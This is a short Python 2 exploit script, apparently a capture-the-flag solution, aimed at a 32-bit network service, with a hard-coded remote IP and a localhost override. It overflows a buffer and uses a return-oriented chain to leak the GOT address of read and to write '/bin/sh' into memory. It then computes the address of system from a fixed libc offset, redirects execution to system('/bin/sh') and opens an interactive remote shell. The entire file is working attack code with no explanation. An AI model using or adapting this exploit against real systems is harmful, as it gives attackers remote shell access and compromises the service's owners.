import sys
sys.path.append("/home/blankwall/Template")
from isis import *
pattern = file("/home/blankwall/Template/pattern").read()
debug = True
host = "210.61.8.96"
port =  51342
host = "localhost"
port = 1234

def connect():
	s = get_socket((host,port))
	s.settimeout(0x10000000)
	return s

def read_got():
	plt_write = 0x08048450
	got_read = 0x0804A00c
	ret = 0x0804867f
	fd = 1
	size = 0x4
	return lei(plt_write,
		ret,
		fd,
		got_read,
		size)
	
def read_data():
	plt_read = 0x080483e0
	ret = 0x0804867f
	stdin = 0
	size = 80
	return lei(plt_read,
		ret,
		stdin,
		0x804a000,
		size)

nop = lei(0x080487ac)
s = connect()
if debug:
	raw_input("?")

buf = "\x00" * 0x56
buf += "B" * 10
buf += "C" * 12
buf += read_data()
s.send(buf)
raw_input(">")
s.send("/bin/sh\0")
raw_input("STAGE 2")
buf = "\x00" * 0x56
buf += "B" * 14
buf += read_got()
s.send(buf)

for i in ulei(s.recv(0x500)):
	system =  hex(i)
	break
system = system.strip("L")
print "READ = " + str(system)
system = int(system,16)
system -= 0x9a070 #0x9b340
print "SYSTEM = " + hex(system)
binsh = lei(0x0804a000)

raw_input("SPLOT?")
s.send("\x00" * 0x56 + "B" * 10 + lei(system) + "ZZZZ" + binsh + lei(system) + "ZZZZ" + binsh + "A" * 20)

telnet_shell(s)
